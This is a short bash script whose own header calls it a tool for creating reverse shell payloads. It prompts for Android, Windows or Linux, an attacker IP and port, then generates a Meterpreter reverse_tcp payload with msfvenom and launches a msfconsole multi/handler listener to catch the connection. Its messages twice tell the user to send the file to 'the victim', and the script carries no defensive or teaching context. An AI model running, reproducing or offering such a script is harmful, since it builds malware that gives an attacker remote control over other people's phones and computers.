#!/bin/bash

echo -e "\e[1;32m ____  __.  _________.__                  .__   "
echo -e "\e[1;32m|    |/ _| /   _____/|  |__   ____   ____ |  |  "
echo -e "\e[1;32m|      <   \_____  \ |  |  \_/ __ \_/ __ \|  |  "
echo -e "\e[1;32m|    |  \  /        \|   Y  \  ___/\  ___/|  |__"
echo -e "\e[1;32m|____|__ \/_______  /|___|  /\___  >\___  >____/"
echo -e "        \/        \/      \/     \/     \/      \e[0m"

echo -e "\e[1;34m###########################################\e[0m"
echo -e "\e[1;34m# Script for creating reverse shell payloads #\e[0m"
echo -e "\e[1;34m# Created by Kirubel Solomne                 #\e[0m"
echo -e "\e[1;34m# LinkedIn: https://shorturl.at/lnRU6        #\e[0m"
echo -e "\e[1;34m###########################################\e[0m"

echo -e "\e[1;36mWhich type of payload do you want to create? Enter '1' for apk (Android), '2' for exe (Windows), or '3' for elf (Linux):"
read choice

echo -e "\e[1;36mEnter the LHOST (e.g., your IP address):"
read lhost


echo -e "\e[1;36mEnter the LPORT (e.g., 4444):"
read lport


echo -e "\e[1;36mEnter the file name (without extension):"
read file_name


if [ "$choice" == "1" ]; then
  payload_type="android/meterpreter/reverse_tcp"
  file_extension="apk"
  payload_name="android"
elif [ "$choice" == "2" ]; then
  payload_type="windows/meterpreter/reverse_tcp"
  file_extension="exe"
  payload_name="windows"
elif [ "$choice" == "3" ]; then
  payload_type="linux/x86/meterpreter/reverse_tcp"
  file_extension="elf"
  payload_name="linux"
else
  echo -e "\e[1;31mInvalid choice. Please enter '1' for apk, '2' for exe, or '3' for elf.\e[0m"
  exit 1
fi


echo -e "\e[1;32mYour payload is preparing. Please wait a moment :)\e[0m"




msfvenom -p $payload_type LHOST="$lhost" LPORT="$lport" -f $file_extension > /tmp/"$file_name.$file_extension"
echo -e "\e[1;32m$payload_name reverse shell payload created successfully at /tmp/$file_name.$file_extension\e[0m"
echo -e "\e[1;32mSend the $payload_name file to the victim and wait for the connection.\e[0m"

clear

echo -e "\e[1;32mPayload file location: /tmp/$file_name.$file_extension\e[0m"
echo -e "\e[1;32mSend the appropriate file to the victim and wait for the connection.\e[0m"


msfconsole -x "use exploit/multi/handler; set payload $payload_type; set lhost $lhost; set lport $lport; exploit"

# Developed by Kirubel Solomne
